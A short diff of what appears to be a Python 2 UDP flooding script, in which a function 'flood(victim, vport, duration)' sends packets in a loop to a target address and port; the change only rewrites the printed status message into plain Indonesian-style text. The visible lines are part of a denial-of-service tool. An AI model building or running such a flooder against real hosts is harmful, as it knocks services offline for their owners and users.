@@ -19,7 +19,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print " 𝗫𝘂𝗵𝗶𝗴𝗵!!  %s 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺  %s 𝗜𝗽 %s 𝗣𝗼𝗿𝘁 "%(sent, victim, vport)
+        print " Tut Tut Tut!!  %s Ad Kiriman %s Ip %s Port "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
